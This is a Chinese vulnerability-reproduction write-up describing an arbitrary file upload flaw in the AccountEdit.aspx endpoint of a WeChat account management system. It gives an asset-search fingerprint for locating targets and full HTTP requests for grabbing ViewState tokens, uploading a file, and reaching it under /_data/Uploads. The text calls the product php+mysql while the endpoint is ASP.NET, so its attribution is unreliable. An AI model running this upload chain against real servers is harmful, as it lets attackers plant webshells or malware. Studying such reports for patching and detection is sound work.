# 微擎微信公众号管理系统系统AccountEdit存在任意文件上传漏洞

# 一、漏洞简介
微擎是一款免费开源的微信公众号管理系统，基于目前流行的WEB2.0架构（php+mysql），支持在线升级和安装模块及模板，拥有良好的开发框架、成熟稳定的技术解决方案、活跃的第三方开发者及开发团队，依托微擎开放的生态系统，提供丰富的扩展功能。微擎系统 AccountEdit接口处存在任意文件上传漏洞，恶意攻击者可以上传恶意软件，例如后门、木马或勒索软件，以获取对服务器的远程访问权限或者破坏系统，对服务器造成极大的安全隐患。

# 二、影响版本
+ 微擎微信公众号管理系统

# 三、资产测绘
+ `body="/Widgets/WidgetCollection/"`
+ 特征![1715655966659-2691b81b-3f4e-405e-9818-bcae75084313.png](./img/KG8Se_y6bFrAXpwJ/1715655966659-2691b81b-3f4e-405e-9818-bcae75084313-147515.png)

# 四、漏洞复现
 1、获取__VIEWSTATE和__EVENTVALIDATION值  

```plain
GET /User/AccountEdit.aspx HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Length: 0
```

![1715656132996-7dfb6248-fb87-4da1-a225-0c4bdac8a293.png](./img/KG8Se_y6bFrAXpwJ/1715656132996-7dfb6248-fb87-4da1-a225-0c4bdac8a293-876973.png)

 2、使用获取到的相应值上传文件  

```plain
POST /User/AccountEdit.aspx HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data;boundary=---------------------------786435874t38587593865736587346567358735687

-----------------------------786435874t38587593865736587346567358735687
Content-Disposition: form-data; name="__VIEWSTATE"

/wEPDwUJNjcyMTYyMDMwD2QWAmYPZBYCAgcPZBYCAgEQFgIeB2VuY3R5cGUFE211bHRpcGFydC9mb3JtLWRhdGFkFgICAQ8PFgIeBFRleHQFigI8TEkgY2xhc3M9VGFiSW4gaWQ9dGFiMSBzdHlsZT0nZGlzcGxheTonPjxBPuWfuuacrOS/oeaBrzwvQT4gPC9MST48TEkgY2xhc3M9VGFiT3V0IGlkPXRhYjQgIHN0eWxlPSdkaXNwbGF5Oic+PEEgIGhyZWY9L1VzZXIvQWNjb3VudEVkaXQuYXNweD90YWI9ND7pgInpobk8L0E+IDwvTEk+PExJIGNsYXNzPVRhYk91dCBpZD10YWI1ICBzdHlsZT0nZGlzcGxheTonPjxBICBocmVmPS9Vc2VyL0FjY291bnRFZGl0LmFzcHg/dGFiPTU+5a+G56CB6K6+572uPC9BPiA8L0xJPmRkZOX0i8mrnQ9ovw3e1OKO9NtVXO50
-----------------------------786435874t38587593865736587346567358735687
Content-Disposition: form-data; name="__EVENTVALIDATION"

/wEWBgKYv82vCAK8ko+sCwLj7JnWDwKavpXnAwKmyMubDAKW1typA0S4QAUrxTuiaAZtLTFPDJ6Hk6Mh
-----------------------------786435874t38587593865736587346567358735687
Content-Disposition: form-data; name="ctl00$MyContentPlaceHolder$ctl00$upload"; filename="ceshi.txt"
Content-Type: text/plain

nihaoanyun
-----------------------------786435874t38587593865736587346567358735687
Content-Disposition: form-data; name="ctl00$MyContentPlaceHolder$ctl00$bttnUpload"

上传图片
-----------------------------786435874t38587593865736587346567358735687
Content-Disposition: form-data; name="ctl00$MyContentPlaceHolder$ctl00$txtLastName"


-----------------------------786435874t38587593865736587346567358735687
Content-Disposition: form-data; name="ctl00$MyContentPlaceHolder$ctl00$txtEmail"


-----------------------------786435874t38587593865736587346567358735687--
```

![1715656234280-31951fd0-70ff-453f-a111-f22b770a31b4.png](./img/KG8Se_y6bFrAXpwJ/1715656234280-31951fd0-70ff-453f-a111-f22b770a31b4-490989.png)

3、访问上传文件

```plain
/_data/Uploads/xxx.txt
```

![1715656329056-51847e50-b1c8-4c99-8b34-5619819dc5ac.png](./img/KG8Se_y6bFrAXpwJ/1715656329056-51847e50-b1c8-4c99-8b34-5619819dc5ac-259114.png)

![1715656372427-2ad70d86-e7cc-4162-bbde-088bed453bac.png](./img/KG8Se_y6bFrAXpwJ/1715656372427-2ad70d86-e7cc-4162-bbde-088bed453bac-696343.png)



> 更新: 2024-05-14 11:15:15  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/qntnmc5zz1xvm56h>